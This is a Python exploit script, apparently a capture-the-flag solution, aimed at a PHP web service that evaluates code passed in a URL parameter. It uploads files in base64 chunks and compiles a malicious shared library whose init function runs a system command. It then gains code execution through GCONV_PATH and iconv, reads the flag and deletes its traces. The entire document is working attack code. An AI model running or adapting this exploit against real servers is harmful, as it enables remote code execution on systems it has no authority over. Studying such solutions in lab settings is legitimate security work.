#!/usr/bin/python3
import requests
import random
import string
import base64
import sys
import os

if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} host port")
    exit(127)

HOST = sys.argv[1]
PORT = sys.argv[2]
BASE_URL = f"http://{HOST}:{PORT}"
UPLOAD_DIR = "/tmp"
PAYLOAD_NAME = "payload"
GCONV_NAME = "gconv-modules"
CHUNK_SIZE = 1000


def print_inf(string):
    print(f"\x1b[94m[*] {string}\x1b[0m")


def print_gud(string):
    print(f"\x1b[92m[+] {string}\x1b[0m")


def rand_name(length=5):
    charset = string.ascii_lowercase + string.digits
    return "".join(random.choice(charset) for _ in range(length))


def delete_file(file_path):
    requests.get(url=BASE_URL, params={"üçº": f"'';unlink('{file_path}')"})


def upload_file(filename, upload_dir):
    # base64 encode the file we want to upload and split it into
    # chunks of size `CHUNK_SIZE`
    f = base64.b64encode(open(filename, "rb").read()).decode()
    chunks = [f[i : i + CHUNK_SIZE] for i in range(0, len(f), CHUNK_SIZE)]

    # generate random filename
    tmp_file = rand_name()

    # send our base64 encoded file one chunk at a time
    for chunk in chunks:
        requests.get(
            url=BASE_URL,
            params={"üçº": f"'';file_put_contents('/tmp/{tmp_file}','{chunk}',8)"},
        )

    # base64 decode assembled chunks
    filename = filename.split("/")[-1]
    requests.get(
        url=BASE_URL,
        params={
            "üçº": f"'';file_put_contents('{upload_dir}/{filename}',base64_decode(file_get_contents('/tmp/{tmp_file}')))"
        },
    )

    # cleanup
    delete_file(f"/tmp/{tmp_file}")


if __name__ == "__main__":
    shared_lib = """
    #include <stdio.h>
    #include <stdlib.h>

    void gconv() {}

    void gconv_init() {
      system("/readflag >/www/flagg.txt");
    }
    """.strip()

    gconv_modules = """
    module  {0}//    INTERNAL    ../../../../../../../..{2}/{1}    2
    module  INTERNAL    {0}//    ../../../../../../../..{2}/{1}    2
    """.format(
        PAYLOAD_NAME.upper(), PAYLOAD_NAME, UPLOAD_DIR
    ).strip()

    tmp_dir = rand_name()
    os.mkdir(tmp_dir)

    # create files
    print_inf("Creating files...")
    open(f"{tmp_dir}/{GCONV_NAME}", "w").write(gconv_modules)
    open(f"{tmp_dir}/{PAYLOAD_NAME}.c", "w").write(shared_lib)

    # compile shared library
    cmd = f"gcc {tmp_dir}/{PAYLOAD_NAME}.c -o {tmp_dir}/{PAYLOAD_NAME}.so -shared -fPIC"
    print_inf(f"Compiling shared library: {cmd}")
    os.system(cmd)

    # upload gconv-modules
    print_inf(f"Uploading {tmp_dir}/{GCONV_NAME}...")
    upload_file(f"{tmp_dir}/{GCONV_NAME}", UPLOAD_DIR)

    # upload shared library
    print_inf(f"Uploading {tmp_dir}/{PAYLOAD_NAME}.so...")
    upload_file(f"{tmp_dir}/{PAYLOAD_NAME}.so", UPLOAD_DIR)

    # trigger the exploit
    print_inf(f"Triggering the exploit...")
    requests.get(
        url=BASE_URL,
        params={
            "üçº": f"'';putenv('GCONV_PATH={UPLOAD_DIR}');iconv('{PAYLOAD_NAME}','UTF-8','anything')"
        },
    )

    # read the flag
    print_inf("Requesting the flag...")
    flag = requests.get(url=f"{BASE_URL}/flagg.txt").content.decode().strip()

    print_gud(f"Flag: {flag}")

    # cleanup
    print_inf("Cleaning up the mess...")
    delete_file(f"{UPLOAD_DIR}/{GCONV_NAME}")
    delete_file(f"{UPLOAD_DIR}/{PAYLOAD_NAME}.so")
    delete_file(f"/www/flagg.txt")
    os.remove(f"{tmp_dir}/{GCONV_NAME}")
    os.remove(f"{tmp_dir}/{PAYLOAD_NAME}.c")
    os.remove(f"{tmp_dir}/{PAYLOAD_NAME}.so")
    os.rmdir(tmp_dir)
